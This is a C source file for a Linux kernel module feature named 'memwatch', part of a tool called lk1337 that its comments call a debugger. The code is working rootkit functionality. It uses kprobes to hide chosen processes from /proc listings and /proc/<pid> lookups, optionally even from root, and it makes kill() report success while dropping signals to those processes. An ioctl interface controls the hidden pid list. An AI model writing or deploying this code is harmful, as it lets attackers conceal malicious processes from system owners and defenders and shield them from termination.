#define pr_fmt(fmt) "memwatch: " fmt

#include <linux/errno.h>
#include <linux/err.h>
#include <linux/atomic.h>
#include <linux/cred.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/spinlock.h>
#include <linux/uaccess.h>
#include <linux/kprobes.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include "memwatch_uapi.h"
#include "memwatch.h"

/* Hidden thread-group id list. Module level: every anonymous fd shares it. */
static pid_t mw_hidden_pids[MW_MAX_HIDDEN];
static int mw_hidden_count;
static DEFINE_RAW_SPINLOCK(mw_hidden_lock);
static atomic_t mw_enabled = ATOMIC_INIT(0);
static u32 mw_flags;

/* Feature flags whose hook actually registered. MW_F_HIDE_ROOT is a policy
 * modifier, not a hook, so it is always available. */
static u32 mw_caps = MW_F_HIDE_ROOT;

/* Small fixed array; the raw spinlock is safe from kprobe pre_handlers. */
static bool mw_is_hidden_pid(int nr)
{
	unsigned long flags;
	bool found = false;
	int i;

	raw_spin_lock_irqsave(&mw_hidden_lock, flags);
	for (i = 0; i < mw_hidden_count; i++) {
		if (mw_hidden_pids[i] == nr) {
			found = true;
			break;
		}
	}
	raw_spin_unlock_irqrestore(&mw_hidden_lock, flags);
	return found;
}

/* A hidden thread group always sees itself, so tools started by it keep
 * working instead of being locked out of /proc. */
static bool mw_reader_exempt(void)
{
	return mw_is_hidden_pid(task_tgid_vnr(current));
}

/* One combined predicate: hide only while enabled, only for listed pids,
 * never for the hidden reader itself, and only for root when asked. */
static bool mw_hide_pid(int nr)
{
	if (nr <= 0)
		return false;
	if (!atomic_read(&mw_enabled))
		return false;
	if (!mw_is_hidden_pid(nr))
		return false;
	if (mw_reader_exempt())
		return false;
	if (READ_ONCE(mw_flags) & MW_F_HIDE_ROOT)
		return true;
	return !uid_eq(current_uid(), GLOBAL_ROOT_UID);
}

/*
 * /proc enumeration. This tree has no proc_pid_fill_cache(); the per-entry
 * cache callback is proc_fill_cache(file, ctx, name, len, instantiate, task,
 * ptr), so x0=file, x2=name, x3=len, x5=task. Only the root listing emits
 * thread-group ids (it passes iter.task with the tgid as name); /proc/<pid>/task
 * passes a thread and is left enumerable. Identify the root of a procfs mount
 * by superblock type, not by dentry name: the mount root dentry name is not
 * stable across devices (observed "/" on a vendor kernel, "proc" elsewhere).
 *
 * lk1337's maps filter also probes proc_fill_cache. That is safe: the
 * aggregate pre-handler stops at the first handler that claims an entry, and
 * both handlers only claim entries they intend to drop, so a suppressed entry
 * is one either feature wanted gone.
 */
static int mw_proc_fill_cache_pre(struct kprobe *p, struct pt_regs *regs)
{
	struct file *file = (struct file *)(uintptr_t)regs->regs[0];
	struct task_struct *task = (struct task_struct *)(uintptr_t)regs->regs[5];
	struct super_block *sb;

	if (!file || !file->f_path.dentry || !task)
		return 0;
	sb = file->f_path.dentry->d_sb;
	if (!sb || strcmp(sb->s_type->name, "proc"))
		return 0;
	if (!(READ_ONCE(mw_flags) & MW_F_PROC_LIST))
		return 0;
	if (!mw_hide_pid(task_tgid_vnr(task)))
		return 0;
	/* Skipping the fill drops this entry while readdir continues with the
	 * next pid, the same idiom the map_files hook uses. */
	regs->regs[0] = 1;
	regs->pc = regs->regs[30];
	return 1;
}

static struct kprobe mw_proc_fill_cache_kp = {
	.symbol_name = "proc_fill_cache",
	.pre_handler = mw_proc_fill_cache_pre,
};

/*
 * Direct /proc/<pid> lookup. In this tree the signature is
 * proc_pid_lookup(struct dentry *dentry, unsigned int flags), so the dentry
 * is x0 (in older trees it was x1).
 */
static int mw_proc_pid_lookup_pre(struct kprobe *p, struct pt_regs *regs)
{
	struct dentry *dentry = (struct dentry *)(uintptr_t)regs->regs[0];
	const char *name;
	char *stop;
	unsigned long nr;

	if (!dentry)
		return 0;
	name = dentry->d_name.name;
	if (!name || name[0] < '0' || name[0] > '9')
		return 0;  /* let "self" and "thread-self" through */
	nr = simple_strtoul(name, &stop, 10);
	if (*stop != '\0' || nr == 0 || nr > INT_MAX)
		return 0;
	if (!(READ_ONCE(mw_flags) & MW_F_PROC_LOOKUP))
		return 0;
	if (!mw_hide_pid((int)nr))
		return 0;
	regs->regs[0] = (unsigned long)ERR_PTR(-ENOENT);
	regs->pc = regs->regs[30];
	return 1;
}

static struct kprobe mw_proc_pid_lookup_kp = {
	.symbol_name = "proc_pid_lookup",
	.pre_handler = mw_proc_pid_lookup_pre,
};

/*
 * Signals addressed at a hidden pid: report success and drop the delivery.
 * This tree's enum pid_type is {PID, TGID, PGID, SID, MAX} = {0, 1, 2, 3, 4},
 * so kill() arrives as type 1 (PIDTYPE_TGID). Process-group and session sends
 * (types 2 and 3) are intentionally not intercepted.
 */
static int mw_do_send_sig_info_pre(struct kprobe *p, struct pt_regs *regs)
{
	struct task_struct *task = (struct task_struct *)(uintptr_t)regs->regs[2];
	unsigned int type = (unsigned int)regs->regs[3];
	int nr;

	if (!task || type > 1)
		return 0;
	if (!(READ_ONCE(mw_flags) & MW_F_SIGNAL))
		return 0;
	nr = type == 0 ? task_pid_vnr(task) : task_tgid_vnr(task);
	if (!mw_hide_pid(nr))
		return 0;
	regs->regs[0] = 0;
	regs->pc = regs->regs[30];
	return 1;
}

static struct kprobe mw_do_send_sig_info_kp = {
	.symbol_name = "do_send_sig_info",
	.pre_handler = mw_do_send_sig_info_pre,
};

static bool mw_fill_cache_hooked;
static bool mw_pid_lookup_hooked;
static bool mw_send_sig_hooked;

/*
 * All three hooks are optional here: lk1337 is the core debugger and must not
 * fail to load because process hiding is unavailable on this kernel. A hook
 * that does not register simply drops its flag from mw_caps, so MW_HIDE_QUERY
 * reports only what is actually in effect.
 */
static int mw_hooks_init(void)
{
	int error;

	mw_caps = MW_F_HIDE_ROOT;

	error = register_kprobe(&mw_proc_fill_cache_kp);
	if (error) {
		pr_warn("proc_fill_cache hook unavailable (%d), /proc enumeration hiding inactive\n",
			error);
	} else {
		mw_fill_cache_hooked = true;
		mw_caps |= MW_F_PROC_LIST;
	}

	error = register_kprobe(&mw_proc_pid_lookup_kp);
	if (error) {
		pr_warn("proc_pid_lookup hook unavailable (%d), /proc/<pid> hiding inactive\n",
			error);
	} else {
		mw_pid_lookup_hooked = true;
		mw_caps |= MW_F_PROC_LOOKUP;
	}

	error = register_kprobe(&mw_do_send_sig_info_kp);
	if (error)
		pr_warn("do_send_sig_info hook unavailable (%d), signal hiding inactive\n",
			error);
	else {
		mw_send_sig_hooked = true;
		mw_caps |= MW_F_SIGNAL;
	}

	return mw_caps == MW_F_HIDE_ROOT ? -ENOENT : 0;
}

static void mw_hooks_exit(void)
{
	if (mw_send_sig_hooked) {
		unregister_kprobe(&mw_do_send_sig_info_kp);
		mw_send_sig_hooked = false;
	}
	if (mw_pid_lookup_hooked) {
		unregister_kprobe(&mw_proc_pid_lookup_kp);
		mw_pid_lookup_hooked = false;
	}
	if (mw_fill_cache_hooked) {
		unregister_kprobe(&mw_proc_fill_cache_kp);
		mw_fill_cache_hooked = false;
	}
}

static int mw_add_hidden_pid(pid_t pid)
{
	unsigned long flags;
	int i;

	if (pid <= 0)
		return -EINVAL;
	raw_spin_lock_irqsave(&mw_hidden_lock, flags);
	for (i = 0; i < mw_hidden_count; i++) {
		if (mw_hidden_pids[i] == pid) {
			raw_spin_unlock_irqrestore(&mw_hidden_lock, flags);
			return 0;  /* already hidden: idempotent */
		}
	}
	if (mw_hidden_count >= MW_MAX_HIDDEN) {
		raw_spin_unlock_irqrestore(&mw_hidden_lock, flags);
		return -ENOSPC;
	}
	mw_hidden_pids[mw_hidden_count++] = pid;
	raw_spin_unlock_irqrestore(&mw_hidden_lock, flags);
	return 0;
}

static int mw_remove_hidden_pid(pid_t pid)
{
	unsigned long flags;
	int i, found = -1;

	raw_spin_lock_irqsave(&mw_hidden_lock, flags);
	for (i = 0; i < mw_hidden_count; i++) {
		if (mw_hidden_pids[i] == pid) {
			found = i;
			break;
		}
	}
	if (found >= 0) {
		for (i = found; i < mw_hidden_count - 1; i++)
			mw_hidden_pids[i] = mw_hidden_pids[i + 1];
		mw_hidden_pids[--mw_hidden_count] = 0;
	}
	raw_spin_unlock_irqrestore(&mw_hidden_lock, flags);
	return found >= 0 ? 0 : -ENOENT;
}

static void mw_clear_hidden_pids(void)
{
	unsigned long flags;

	raw_spin_lock_irqsave(&mw_hidden_lock, flags);
	mw_hidden_count = 0;
	raw_spin_unlock_irqrestore(&mw_hidden_lock, flags);
}

static int mw_query_state(struct mw_state *s)
{
	unsigned long flags;
	int i;

	s->enabled = atomic_read(&mw_enabled);
	s->flags = READ_ONCE(mw_flags);
	s->reserved = 0;
	raw_spin_lock_irqsave(&mw_hidden_lock, flags);
	s->count = mw_hidden_count;
	for (i = 0; i < MW_MAX_HIDDEN; i++)
		s->pids[i] = i < mw_hidden_count ? mw_hidden_pids[i] : 0;
	raw_spin_unlock_irqrestore(&mw_hidden_lock, flags);
	return 0;
}

bool lk1337_memwatch_command(unsigned int cmd)
{
	switch (cmd) {
	case MW_HIDE_ADD:
	case MW_HIDE_REMOVE:
	case MW_HIDE_CLEAR:
	case MW_HIDE_ENABLE:
	case MW_HIDE_QUERY:
		return true;
	default:
		return false;
	}
}

long lk1337_memwatch_dispatch(unsigned int cmd, void __user *arg)
{
	struct mw_pid request;
	struct mw_enable enable;
	struct mw_state state;
	u32 flags;
	pid_t pid;
	int error;

	switch (cmd) {
	case MW_HIDE_ADD:
		if (copy_from_user(&request, arg, sizeof(request)))
			return -EFAULT;
		/* pid 0 means the caller's own thread group. */
		pid = request.pid ? request.pid : task_tgid_vnr(current);
		return mw_add_hidden_pid(pid);
	case MW_HIDE_REMOVE:
		if (copy_from_user(&request, arg, sizeof(request)))
			return -EFAULT;
		return mw_remove_hidden_pid(request.pid);
	case MW_HIDE_CLEAR:
		mw_clear_hidden_pids();
		return 0;
	case MW_HIDE_ENABLE:
		if (copy_from_user(&enable, arg, sizeof(enable)))
			return -EFAULT;
		if (enable.flags & ~(MW_F_PROC_LIST | MW_F_PROC_LOOKUP |
				     MW_F_SIGNAL | MW_F_HIDE_ROOT))
			return -EINVAL;
		/* Features whose hook is missing are dropped, not silently
		 * reported as active. */
		flags = enable.flags & mw_caps;
		if (flags != enable.flags)
			pr_warn("flags 0x%x masked to 0x%x (hook unavailable)\n",
				enable.flags, flags);
		WRITE_ONCE(mw_flags, flags);
		atomic_set(&mw_enabled, enable.enable != 0);
		return 0;
	case MW_HIDE_QUERY:
		error = mw_query_state(&state);
		if (!error && copy_to_user(arg, &state, sizeof(state)))
			error = -EFAULT;
		return error;
	default:
		return -ENOTTY;
	}
}

int lk1337_memwatch_init(void)
{
	int error = mw_hooks_init();

	if (error)
		return error;
	pr_info("process hiding ready (abi=%d caps=0x%x)\n",
		MW_ABI_VERSION, mw_caps);
	return 0;
}

void lk1337_memwatch_exit(void)
{
	mw_hooks_exit();
	atomic_set(&mw_enabled, 0);
	WRITE_ONCE(mw_flags, 0);
	mw_clear_hidden_pids();
	mw_caps = MW_F_HIDE_ROOT;
	pr_info("process hiding stopped\n");
}
